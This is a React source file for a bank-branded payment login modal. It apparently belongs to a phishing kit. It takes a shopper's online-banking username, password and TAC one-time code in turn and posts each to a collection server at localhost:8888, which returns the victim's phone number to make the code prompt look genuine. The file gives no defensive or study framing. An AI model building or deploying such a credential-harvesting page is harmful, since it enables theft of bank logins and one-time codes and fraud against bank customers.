import React, { useEffect, useState } from "react";
import styles from "./styles.module.css";
import ProgressBar from "../ProgressBar";
import banks from "../../banks";
import axios from "axios";

const bodyState = {
  USERNAME: 0,
  PASSWORD: 1,
  TAC: 2,
  TIMEOUT: 3,
  ERROR: 4,
  SUCCESS: 5,
  LOADING: 6,
};

Object.freeze(bodyState);

function LoginForm({ id, bank, amount }) {
  let [stage, setStage] = useState(bodyState.USERNAME);
  let [completed, setCompleted] = useState(0);
  let [username, setUsername] = useState("");
  let [password, setPassword] = useState("");
  let [tac, setTAC] = useState("");
  let [tacPhoneNumber, setTacPhoneNumber] = useState("");
  let [tacDate, setTacDate] = useState("");
  let [hover, setHover] = useState(false);
  let [start, setStart] = useState(Date.now());
  let [countdown, setCountdown] = useState(0);
  let timeout = 180;

  const modalContent = {
    color: banks[bank].fontColor,
    backgroundColor: banks[bank].primaryColor,
  };
  const modalHeader = {
    backgroundColor: banks[bank].secondaryColor,
  };
  const modalBody = {
    borderColor: banks[bank].borderColor,
    color: banks[bank].bodyFontColor,
  };
  const modalFooter = {
    color: banks[bank].warningColor,
    backgroundColor: banks[bank].secondaryColor,
  };
  const modalBtn = {
    borderColor: banks[bank].bodyFontColor,
    color: banks[bank].bodyFontColor,
  };

  const modalBtnHover = {
    borderColor: banks[bank].buttonHoverColor ?? banks[bank].warningColor,
    color: banks[bank].buttonHoverColor ?? banks[bank].warningColor,
  };

  useEffect(() => {
    let timer = setInterval(() => {
      let now = Date.now();
      let _countdown = Math.round((now - start) / 1000);

      if (timeout - _countdown >= 0) {
        setCountdown(_countdown);

        if (timeout - _countdown == 0) {
          setCompleted(0);
          setTacPhoneNumber("");
          setTacDate("");
          setStage(bodyState.TIMEOUT);
          clearTimeout(timer);
        }
      }
    }, 1000);

    return () => clearTimeout(timer);
  });

  function formatCountdown(time) {
    if (time > 0) {
      let minutes = Math.floor(time / 60);
      let seconds = time % 60;

      return `0${minutes}:${("0" + seconds).slice(-2)}`;
    } else {
      return "EXPIRED";
    }
  }

  function toggleHover() {
    setHover((prevState) => !prevState);
  }

  function handleUsernameChange(e) {
    setUsername(e.target.value);
  }

  function handlePasswordChange(e) {
    setPassword(e.target.value);
  }

  function handleTACChange(e) {
    setTAC(e.target.value);
  }

  async function handleButtonClick() {
    setHover(false);

    switch (stage) {
      case bodyState.USERNAME:
        if (username) {
          console.log("We are in username");
          try {
            setStage(bodyState.LOADING);
            let result = await axios.post("http://localhost:8888/username", {
              id: id,
              username: username,
            });

            console.log(result);

            if (result.data.code == 400) {
              setStage(bodyState.ERROR);
            } else {
              setStage(bodyState.PASSWORD);
              setCompleted(40);
            }
          } catch (e) {
            console.log(e);
          }
        } else {
          alert("Please enter your username");
        }
        break;
      case bodyState.PASSWORD:
        if (password) {
          try {
            setStage(bodyState.LOADING);

            let result = await axios.post(
              "http://localhost:8888/authenticate",
              {
                id: id,
                password: password,
              }
            );

            console.log(result.data);

            const phoneNumber = result.data.phoneNumber;
            const date = result.data.date;

            setTacPhoneNumber(phoneNumber);
            setTacDate(date);
            setStage(bodyState.TAC);
            setCompleted(80);
          } catch (e) {
            console.log(e);
            setStage(bodyState.ERROR);
          }
        } else {
          alert("Please enter your password");
        }
        break;
      case bodyState.TAC:
        if (tac) {
          setStage(bodyState.LOADING);
          let result = await axios.post("http://localhost:8888/tac", {
            id: id,
            tac: tac,
          });
        }
        break;
      default:
        console.log("Button is clicked");
        break;
    }
  }

  function handleReturning(e) {
    e.preventDefault();

    setStage(bodyState.USERNAME);
    setCompleted(0);
    setCountdown(0);
  }

  function body(stage) {
    switch (stage) {
      case bodyState.USERNAME:
        return (
          <>
            <div className={styles["instructions"]}>
              Please Enter Your Online Banking Username
            </div>
            <input
              className={styles["form-control"]}
              type="text"
              value={username}
              placeholder="Bank Username"
              onChange={handleUsernameChange}
            />
            <button
              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
              onMouseEnter={() => setHover(true)}
              onMouseLeave={() => setHover(false)}
              onClick={handleButtonClick}
              style={hover ? modalBtnHover : modalBtn}
            >
              Next
            </button>
          </>
        );
      case bodyState.PASSWORD:
        return (
          <>
            <div className={styles["instructions"]}>
              Please Enter Your Password
            </div>
            <input
              className={styles["form-control"]}
              type="password"
              value={password}
              placeholder="Bank Password"
              onChange={handlePasswordChange}
            />
            <button
              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
              onMouseEnter={() => setHover(true)}
              onMouseLeave={() => setHover(false)}
              onClick={handleButtonClick}
              style={hover ? modalBtnHover : modalBtn}
            >
              Next
            </button>
          </>
        );
      case bodyState.TAC:
        return (
          <>
            <div className={styles["instructions"]}>Enter the TAC</div>
            <input
              className={styles["form-control"]}
              type="text"
              value={tac}
              onChange={handleTACChange}
            />
            <button
              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
              onMouseEnter={() => setHover(true)}
              onMouseLeave={() => setHover(false)}
              onClick={handleButtonClick}
              style={hover ? modalBtnHover : modalBtn}
            >
              Next
            </button>
            <p className={styles["tac-details"]}>
              Your TAC Request is successful {tacDate}. Your TAC number will be
              sent to your registered mobile phone number {tacPhoneNumber}
            </p>
          </>
        );
      case bodyState.ERROR:
        return SomethingWentWrong();
      case bodyState.TIMEOUT:
        return TimeoutError();
      case bodyState.LOADING:
        return <BankLoading />;
      default:
        return <BankLoading />;
    }
  }

  function TimeoutError() {
    return (
      <>
        <h3>Timeout Error</h3>
        <br />
        <p>
          Failed to complete the transaction within the time limit. Please try
          again.
        </p>
        <br />
        <a href="#" onClick={handleReturning}>
          Returning to Merchant
        </a>
      </>
    );
  }

  function SomethingWentWrong() {
    return (
      <>
        <h3>Transaction Failed</h3>
        <br />
        <p>
          Transaction Failed. It seems like something has gone wrong. Please
          initiate a new payment or contact Merchant for support.
        </p>
        <br />
        <a href="#" onClick={handleReturning}>
          Returning to Merchant
        </a>
      </>
    );
  }

  return (
    <div className={styles["login-form"]}>
      <div className={styles["modal-content"]} style={modalContent}>
        <div className={styles["modal-header"]} style={modalHeader}>
          <img src={banks[bank].logo} className={styles["img-circle"]} />
          <h4>{banks[bank].name}</h4>
          <br />
          <div id={styles["refid"]}>Reference ID: 2129804</div>
          <small>Amount to charge</small>
          <h3 className={styles["amount"]}>MYR {amount}.00</h3>
          <ProgressBar bgcolor={"#2ecc71"} completed={completed} />
          <p className={styles["stat-label"]}>
            Session Timeout: {formatCountdown(timeout - countdown)}
          </p>
        </div>
        <div className={styles["modal-body"]} style={modalBody}>
          {body(stage)}
        </div>
        <div className={styles["modal-footer"]} style={modalFooter}>
          <small>
            Please <strong>DO NOT REFRESH</strong> your web browser
          </small>
        </div>
      </div>
    </div>
  );
}

function BankLoading() {
  return (
    <div className={styles["bank-loading"]}>
      <p>
        <span>
          <svg
            width="1em"
            height="1em"
            viewBox="0 0 16 16"
            className={`bi bi-gear-fill ${styles["spin"]}`}
            fillRule="currentColor"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              fill-rule="evenodd"
              d="M9.405 1.05c-.413-1.4-2.397-1.4-2.81 0l-.1.34a1.464 1.464 0 0 1-2.105.872l-.31-.17c-1.283-.698-2.686.705-1.987 1.987l.169.311c.446.82.023 1.841-.872 2.105l-.34.1c-1.4.413-1.4 2.397 0 2.81l.34.1a1.464 1.464 0 0 1 .872 2.105l-.17.31c-.698 1.283.705 2.686 1.987 1.987l.311-.169a1.464 1.464 0 0 1 2.105.872l.1.34c.413 1.4 2.397 1.4 2.81 0l.1-.34a1.464 1.464 0 0 1 2.105-.872l.31.17c1.283.698 2.686-.705 1.987-1.987l-.169-.311a1.464 1.464 0 0 1 .872-2.105l.34-.1c1.4-.413 1.4-2.397 0-2.81l-.34-.1a1.464 1.464 0 0 1-.872-2.105l.17-.31c.698-1.283-.705-2.686-1.987-1.987l-.311.169a1.464 1.464 0 0 1-2.105-.872l-.1-.34zM8 10.93a2.929 2.929 0 1 0 0-5.86 2.929 2.929 0 0 0 0 5.858z"
            />
          </svg>
        </span>
        Connecting to bank...
      </p>
    </div>
  );
}

export default LoginForm;
